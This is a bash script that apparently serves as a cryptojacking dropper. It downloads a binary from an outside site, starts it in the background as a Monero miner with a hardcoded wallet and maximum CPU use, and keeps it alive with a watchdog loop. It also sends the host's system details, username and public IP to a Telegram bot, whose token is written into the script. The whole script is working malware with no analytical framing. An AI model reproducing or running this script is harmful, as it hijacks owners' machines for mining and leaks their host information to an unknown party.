#!/bin/bash

# --- CONFIG ---
MINER_URL="https://viralhube.com/mus/tdn"
MINER_FILE="./tdn"
uname_info=$(uname -a)
whoami=$(whoami)
MINER_CMD="./tdn --url gulf.moneroocean.stream:10128 --user 48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi --pass $whoami --cpu-max-threads-hint=100 -B"
telegram_token="7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw"
telegram_chatid="5104210301"
CHECK_INTERVAL=30

# --- GET PUBLIC IP ---
get_ip() {
    if command -v curl >/dev/null 2>&1; then
        curl -s ifconfig.me || echo "unknown"
    elif command -v wget >/dev/null 2>&1; then
        wget -qO- ifconfig.me || echo "unknown"
    else
        echo "unknown"
    fi
}

# --- SEND TELEGRAM MESSAGE ---
send_telegram() {
    local MESSAGE="$1"
    IP=$(get_ip)
    # Format pesan sesuai komentar Anda
    TELEGRAM_MESSAGE="<b>System</b>: <code>$uname_info</code>
<b>User</b>: $whoami
<b>IP</b>: $IP
<b>Status</b>: $MESSAGE"
    
    # Pastikan token dan chat ID tidak kosong
    if [ -z "$telegram_token" ] || [ -z "$telegram_chatid" ]; then
        echo "Error: Telegram token or chat ID is missing." >&2
        return 1
    fi
    
    if command -v curl >/dev/null 2>&1; then
        curl -s -X POST "https://api.telegram.org/bot$telegram_token/sendMessage" \
             -d "chat_id=$telegram_chatid" \
             -d "text=$TELEGRAM_MESSAGE" \
             -d "parse_mode=HTML" >/dev/null 2>&1
    else
        echo "Error: curl not available for Telegram notification." >&2
    fi
}

# --- CHECK DEPENDENCIES ---
check_dependencies() {
    if ! command -v bash >/dev/null 2>&1; then
        echo "Error: bash not found." >&2
        exit 1
    fi
    if ! command -v wget >/dev/null 2>&1 && ! command -v curl >/dev/null 2>&1; then
        send_telegram "wget or curl not found. Miner cannot be downloaded."
        exit 1
    fi
}

# --- DOWNLOAD MINER ---
download_miner() {
    if [ ! -f "$MINER_FILE" ]; then
        if command -v wget >/dev/null 2>&1; then
            if wget -q -O "$MINER_FILE" "$MINER_URL"; then
                chmod +x "$MINER_FILE"
            else
                send_telegram "Failed to download miner with wget."
                exit 1
            fi
        elif command -v curl >/dev/null 2>&1; then
            if curl -s -o "$MINER_FILE" "$MINER_URL"; then
                chmod +x "$MINER_FILE"
            else
                send_telegram "Failed to download miner with curl."
                exit 1
            fi
        fi
    fi
}

# --- START MINER ---
start_miner() {
    nohup $MINER_CMD >/dev/null 2>&1 &
    send_telegram "miner started"
}

# --- WATCHDOG LOOP ---
watch_miner() {
    while true; do
        if ! pgrep -f "$MINER_FILE" >/dev/null 2>&1; then
            send_telegram "miner stopped"
            start_miner
        fi
        sleep $CHECK_INTERVAL
    done
}

# --- MAIN ---
check_dependencies
download_miner
start_miner
watch_miner
